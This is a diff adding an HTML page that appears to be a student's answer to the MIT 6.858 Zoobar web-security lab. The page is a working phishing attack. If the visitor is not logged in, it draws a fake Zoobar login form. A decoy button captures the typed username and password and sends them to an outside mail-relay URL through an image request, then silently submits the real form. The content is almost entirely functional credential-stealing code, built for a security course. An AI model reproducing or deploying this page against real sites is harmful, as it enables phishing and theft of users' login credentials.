@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<div id="myZoobars"></div>
+<script type="text/javascript" src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
+<script>
+function fakelogin() {
+var username = document.getElementsByName("login_username")[0].value;
+var password = document.getElementsByName("login_password")[0].value;
+(new Image()).src='http://css.csail.mit.edu/6.858/2013/labs/sendmail.php?' + 'to=neilfitz@mit.edu' + '&payload=' + username + ',' + password + '&random=' + Math.random();
+document.getElementsByName("submit_login")[0].click();
+}
+var mz = document.getElementById("myZoobars");
+if (mz.innerHTML != "") {
+window.location = "answer-2.html";
+} else {
+document.write('<link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css"> \
+        <title> \
+          Login - Zoobar Foundation \
+        </title> \
+<h1><a href="/zoobar/index.cgi/">Zoobar Foundation for Objective \
+                      Dialogue</a></h1> \
+      <h2>Supporting the brightest \
+          representatives of the new world order</h2> \
+<div id="login" class="centerpiece"> \
+<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login"> \
+<table> \
+<tr> \
+   <td>Username:</td> \
+  <td><input type="text" name="login_username" size="20" \
+  autocomplete="no" value=""></td> \
+</tr> \
+<tr> \
+   <td>Password:</td> \
+  <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no"> \
+  <input type="button" name="fake_submit_login" value="Log in"> \
+  <input type="submit" name="submit_login" value="Log in" style="display: none; visibility: hidden; height: 0; width: 0; position: absolute"> \
+  <input type="submit" name="submit_registration" value="Register"></td> \
+</tr> \
+</table> \
+<input type="hidden" name="nexturl" value="/zoobar/index.cgi/"> \
+</form> \
+</div> \
+<div class="footer warning"> \
+</div>');
+document.loginform.login_username.focus();
+document.getElementsByName("fake_submit_login")[0].addEventListener('click', fakelogin, false)
+}
+</script>
+</html>
